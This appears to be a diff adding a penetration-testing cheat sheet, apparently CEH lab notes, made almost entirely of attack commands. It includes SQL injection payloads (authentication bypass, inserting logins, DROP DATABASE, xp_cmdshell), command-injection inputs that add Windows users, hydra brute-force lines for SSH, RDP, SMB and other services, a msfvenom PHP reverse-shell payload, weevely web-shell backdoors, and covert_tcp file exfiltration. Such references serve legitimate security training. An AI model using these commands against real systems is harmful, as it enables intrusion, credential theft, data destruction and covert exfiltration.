@@ -1,0 +1,106 @@
+Ping sweep and then dump a list of live hosts into hosts.txt
+nohup nmap -sn 192.168.1.0/24 | grep -i "nmap scan" | cut -d " " -f 5 > hosts.txt &
+Ping sweep(Subnet): namp -sP X.X.X.X/24
+TCP Syn scan: nmap -sS <Target IP>
+Intense scan: nmap -T4 -A <Target IP>
+Zenmap detect sniffing: nmap --script=sniffer-detect <Target IP/IP addr range>
+
+Evade scan cmds
+Zombie(Idle) scan: nmap -sI <Zombie IP> <Target IP>
+
+Server/websites:nmap -sV --script=http-enum [target website
+                nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- <web/IP>
+HTTP Trace: nmap --script http-trace -d <web/IP>
+WAF:nmap -p80 --script http-waf-detect <web/IP> 
+Webserver: nmap -sV --script=http-enum <domain/web/IP>
+
+
+wpscan
+Scanning and enumeration. Wordpress weaknesses.
+wpscan --api-token <API Token> --url http://10.10.10.16:8080/CEH --plugins-detection aggressive --enumerate vp
+
+
+Probe hostname: | hostname
+User, privileges: | whoami
+List of running process: | tasklist
+Kill task: | taskkill <PID of process to kill>
+View C dir: | dir C:\
+View accounts: | net user
+View account info: | net user <name>
+Add user: | net user <name>/Add 
+
+Username: blah’ or 1=1 --
+Insert username: blah';insert into login values ('john','apple123'); --
+Insert new database: blah';create database <mydatabase>; --
+Delete database: blah'; DROP DATABASE mydatabase; --
+Ping another web:blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; --
+
+
+John The Ripper
+Cracking hashes and passwords
+sudo john /home/ubuntuXXX/XXX/XXX.txt
+nikto
+Scanning for vulnerabilities
+ -h: specifies the target host and 
+ -Tuning x: specifies the Reverse Tuning Options (i.e., include all except specified) 
+nikto -h <Target Website> -Tuning x -o Nikto_Scan_Results -F txt
+
+
+
+hydra
+Brute forcing service / Cracking
+hydra -L <username_list> -P <Passoword_List> <Target IP> <Protocol>
+hydra -l root -P passwords.txt [-t 32] <IP> ftp
+hydra -L usernames.txt -P pass.txt <IP> mysql
+hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
+hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
+hydra -P common-snmp-community-strings.txt target.com snmp
+hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
+hydra -l root -P passwords.txt <IP> ssh
+
+
+
+Gobuster
+Brute-forcing URLS, DNS subdomains, vhost names and S3 Buckets
+gobuster dir -u <Target Website> -w /root/Desktop/common.txt
+
+
+
+Uniscan
+Scan web directories, robot txt
+Scan for dir: uniscan -u http://<IP>/<home dir> -q
+Robot.txt, sitemap.xml: uniscan -u http://<IP>/<home dir> -we
+Dynamic test: uniscan -u http://<IP>/<home dir> -d
+Use firefox to open file in usr/share/uniscan/report
+
+
+
+Msfconsole
+Enum login details: use auxiliary/scanner/http/wordpress_login_enum
+use exploit/multi/handler
+
+
+Msfvenom
+Create payload: msfvenom -p php/meterpreter/reverse_tcp LHOST=<Host IP> LPORT=4444 -f raw
+                
+Weevely
+Gen shell file:weevely generate <PW><File Path>
+Backdoor: weevely <File Path in web server e.g http://10.10.10.16:8080/dvwa/hackable/uploads/shell.php> <PW>
+                
+
+
+Steganography tools…
+White space Steno(Snow tool)
+Create file to hide: snow -C -m “xxxxxx” -p “Password”” filename.txt filename2.txt
+Reveal xxx: snow -C -p “magic” filename2.txt
+Image Steno(OpenStego stool)
+Hide file: Upload Msg file into Cover file.
+Covert Channels(Covert_TCP)
+Target: To have covert_tcp.c file inside and compile.
+        cc -o covert_tcp covert_tcp.c (Compile tcp.c file)
+        ./covert_tcp -dest x.x.x.x - source x.x.x.x -source_port 888 - dest_port 9999 -file /Send file address (Send file contents over tcp to Listener)
+Host: tcpdump -nvvx port 8888 -i lo (start tcpdump)
+      cc -o covert_tcp covert_tcp.c (Compile tcp.c file)
+      ./covert_tcp -dest x.x.x.x -source x.x.x.x -source_port 9999 -dest_port 8888 -server -file /Receive file address  (Start listener and output to file)
+
+
